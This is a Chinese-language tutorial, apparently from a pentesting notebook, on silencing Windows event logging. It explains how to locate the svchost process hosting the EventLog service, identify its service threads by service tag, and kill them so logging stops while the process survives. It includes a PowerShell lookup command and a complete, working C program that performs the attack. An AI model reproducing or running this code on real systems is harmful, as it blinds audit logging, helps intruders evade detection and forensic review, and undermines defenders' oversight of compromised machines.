# 基于线程结束的EventLog绕过

## 简介

通常windows系统本身会记录一些较为特殊的操作，如登录、注销，而实现这部分功能通常是由windows自生的服务实现，windows 系统服务主要由svchost.exe进程进行启动和管理，本文会介绍如何从操作系统中识别并结束EventLog的服务线程，从而绕过windows的日志记录。

## 流程

1. 找到EventLog对应的进程
2. 找到EventLog进程具体的服务线程
3. 结束服务线程

## 原理

首先我们需要定位到EventLog服务对应的进程，使用windows的services.msc查看发现windows服务是由svchost指定-s参数查询注册服务进行启动，那我们可以通过遍历系统所有进程的commandline是否带有eventlog服务名来进行识别，主要实现方式由两种，通过进程快照遍历或通过调用wmi接口来识别。

对服务不了解的朋友可以看看[这个](../persistence/startup-service.md)。

```text
Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId
```

![](../.gitbook/assets/image%20%28183%29.png)

![](../.gitbook/assets/image%20%28185%29.png)

![](../.gitbook/assets/image%20%28186%29.png)

获取到进程号之后我们需要识别具体的服务线程，在windows vista之后的系统，具体的服务线程约定使用servicemain作为入口点，同时服务线程自身会带有一个等同于服务名的tag，这个tag可以帮我们识别这个线程是否是我们寻找的，在x64线程teb中0x1720偏移的位置存放着service tag的句柄，我们可以那这个句柄使用I\_QueryTagInformation api查询到具体service tag内容。\(句柄-&gt;内容，需要查询内核\_eprocess句柄表，有机会补上\)。

![](../.gitbook/assets/image%20%28182%29.png)

![](../.gitbook/assets/image%20%28184%29.png)

最后我们把识别出来的服务线程结束就好，因为转换成分派控制器的主线程依旧存在，所以进程本身并不会结束，这样就能很好的架空的日志服务。

## 代码

运行效果:

![](../.gitbook/assets/image%20%28181%29.png)

![](../.gitbook/assets/image%20%28187%29.png)

```text
#include <Windows.h>
#include <tchar.h>
#include <stdio.h>
#include <winternl.h>
#include <Tlhelp32.h>
#include <string.h>
#include <strsafe.h>
#pragma comment(lib, "ntdll.lib") 


typedef long NTSTATUS;

/**/
typedef struct _THREAD_BASIC_INFORMATION
{
    NTSTATUS    exitStatus;
    PVOID       pTebBaseAddress;
    CLIENT_ID   clientId;
    KAFFINITY               AffinityMask;
    int						Priority;
    int						BasePriority;
    int						v;

} THREAD_BASIC_INFORMATION, * PTHREAD_BASIC_INFORMATION;

typedef enum _SC_SERVICE_TAG_QUERY_TYPE
{
    ServiceNameFromTagInformation = 1,
    ServiceNameReferencingModuleInformation,
    ServiceNameTagMappingInformation,
} SC_SERVICE_TAG_QUERY_TYPE, * PSC_SERVICE_TAG_QUERY_TYPE;

typedef struct _SC_SERVICE_TAG_QUERY
{
    ULONG   processId;
    ULONG   serviceTag;
    ULONG   reserved;
    PVOID   pBuffer;
} SC_SERVICE_TAG_QUERY, * PSC_SERVICE_TAG_QUERY;

typedef ULONG(WINAPI* pI_QueryTagInformation)(PVOID, SC_SERVICE_TAG_QUERY_TYPE, PSC_SERVICE_TAG_QUERY);
typedef NTSTATUS(WINAPI* pNtQueryInformationThread)(HANDLE, THREAD_INFORMATION_CLASS, PVOID, ULONG, PULONG);


BOOL CheckEventProcess(DWORD ProcessId) {
    BOOL result = 0;
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, ProcessId);
    if (!hProcess)
    {
        return false;
    }
    DWORD status = NtQueryInformationProcess(hProcess, (PROCESSINFOCLASS)0, &pbi, sizeof(PVOID) * 6, NULL);

    PPEB ppeb = (PPEB)((PVOID*)&pbi)[1];
    PEB pebdata = { 0 };

    ReadProcessMemory(hProcess, ppeb, &pebdata, sizeof(PEB), NULL);

    PRTL_USER_PROCESS_PARAMETERS prtlp = (&pebdata)->ProcessParameters;
    RTL_USER_PROCESS_PARAMETERS rtlp = { 0 };

    ReadProcessMemory(hProcess, prtlp, &rtlp, sizeof(RTL_USER_PROCESS_PARAMETERS), NULL);

    PWSTR lpBuffer = (PWSTR)(&rtlp)->CommandLine.Buffer;
    USHORT len = (USHORT)(&rtlp)->CommandLine.Length;

    LPWSTR lpStrings = (LPWSTR)malloc(len);

    ZeroMemory(lpStrings, len);

    ReadProcessMemory(hProcess, lpBuffer, lpStrings, len, NULL);


    if (wcsstr(lpStrings, L"EventLog"))
    {
        result = true;
    }

    free(lpStrings);

    return result;
}

DWORD GetEventLogProcessId() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot)
    {
        return 0;
    }
    DWORD logpid = 0;
    PROCESSENTRY32W pe32 = { 0 };
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    BOOL bRet = Process32FirstW(hSnapshot, &pe32);
    while (bRet)
    {
        if (CheckEventProcess(pe32.th32ProcessID))
        {
            logpid = pe32.th32ProcessID;
            CloseHandle(hSnapshot);
            return logpid;
        }
        bRet = Process32NextW(hSnapshot, &pe32);
    }
    CloseHandle(hSnapshot);
    return 0;
}


BOOL CheckAndFuckEventProcess(DWORD processId, DWORD threadId, PULONG pServiceTag)
{


    ;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    HANDLE hTag = NULL;
    HMODULE advapi32 = NULL;
    THREAD_BASIC_INFORMATION tbi = { 0 };
    pI_QueryTagInformation I_QueryTagInformation = NULL;
    pNtQueryInformationThread NtQueryInformationThread = NULL;
    SC_SERVICE_TAG_QUERY tagQuery = { 0 };
    WCHAR Buffer[MAX_PATH] = { 0 };

    NtQueryInformationThread = (pNtQueryInformationThread)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationThread");
    hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId);
    NtQueryInformationThread(hThread, (THREAD_INFORMATION_CLASS)0, &tbi, 0x30, NULL);//内存对齐
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    ReadProcessMemory(hProcess, ((PBYTE)tbi.pTebBaseAddress + 0x1720), &hTag, sizeof(HANDLE), NULL);


    advapi32 = LoadLibrary(L"advapi32.dll");

    I_QueryTagInformation = (pI_QueryTagInformation)GetProcAddress(advapi32, "I_QueryTagInformation");
    tagQuery.processId = processId;
    tagQuery.serviceTag = (ULONG)hTag;
    I_QueryTagInformation(NULL, ServiceNameFromTagInformation, &tagQuery);
    if (tagQuery.pBuffer != 0)
    {
        StringCbCopy(Buffer, MAX_PATH, (PCWSTR)tagQuery.pBuffer);
    }
    else
    {

        CloseHandle(hProcess);
        CloseHandle(hThread);
        FreeLibrary(advapi32);
        return 0;
    }

    if (!wcscmp(Buffer, L"EventLog"))
    {
        TerminateThread(hThread,0);
        wprintf((WCHAR*)L"%d %s\n", threadId, Buffer);
    }
    LocalFree(tagQuery.pBuffer);
    CloseHandle(hProcess);
    CloseHandle(hThread);
    FreeLibrary(advapi32);

    return 1;
}

int main() {
    DWORD dwPid;

    dwPid = GetEventLogProcessId();

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot)
    {
        return 0;
    }
    THREADENTRY32 te32 = { 0 };
    te32.dwSize = sizeof(THREADENTRY32);

    BOOL bRet = Thread32First(hSnapshot, &te32);
    while (bRet)
    {
        if (te32.th32OwnerProcessID == dwPid)
        {
            CheckAndFuckEventProcess(dwPid, te32.th32ThreadID, NULL);
        }


        bRet = Thread32Next(hSnapshot, &te32);
    }
    CloseHandle(hSnapshot);
    return 0;

}
```

## LINKS

{% embed url="http://www.winsiderss.com/tools/sctagquery/sctagquery.htm" %}

{% embed url="https://artofpwn.com/2017/06/05/phant0m-killing-windows-event-log.html" %}

{% embed url="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87/" %}

{% embed url="https://wj32.org/wp/2010/03/30/howto-use-i\_querytaginformation/" %}



